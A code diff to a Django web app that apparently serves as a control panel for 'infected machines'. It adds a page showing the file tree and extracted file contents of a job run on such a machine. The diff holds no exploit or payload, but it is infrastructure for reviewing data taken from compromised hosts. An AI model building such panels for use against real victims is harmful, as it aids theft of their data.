@@ -51,6 +51,24 @@ def jobs(request: HttpRequest):
         "filter_machine_id": filter_machine_id,
     })
 
+def show_job_extracted(request: HttpRequest, job_id: int):
+    job = Job.objects.filter(id=job_id).first()
+    if job is None:
+        return redirect('jobs')
+
+    files_tree = file_tree(job.data_folder_path())
+
+    extracted = 'No file yet'
+    if os.path.isfile(job.extracted_file_path()):
+        with open(job.extracted_file_path(), 'r') as f:
+            extracted = f.read()
+
+    return render(request, "job_extracted.html", {
+        "job": job,
+        "files_tree": files_tree,
+        "extracted": extracted
+    })
+
 @require_POST
 def job_create(request: HttpRequest, machine_id: int):
     machine = InfectedMachine.objects.filter(id=machine_id).first()
@@ -99,7 +117,7 @@ def debug(request: HttpRequest):
     })
 
 def file_tree(folder_path: str, prefix="") -> str:
-    result = ""
+    result = f"{folder_path}\n"
     entries = sorted(os.scandir(folder_path), key=lambda e: (not e.is_dir(), e.name))
     for i, entry in enumerate(entries):
         connector = "└── " if i == len(entries) - 1 else "├── "
@@ -117,6 +135,7 @@ urlpatterns = [
     path('debug', debug, name='debug'),
     path('job/create/<int:machine_id>', job_create, name='job_create'),
     path('job/delete/<int:job_id>', job_delete, name='job_delete'),
+    path('job/show-extracted/<int:job_id>', show_job_extracted, name='show_job_extracted'),
 ]
 if settings.DEBUG:
     # Include django_browser_reload URLs only in DEBUG mode
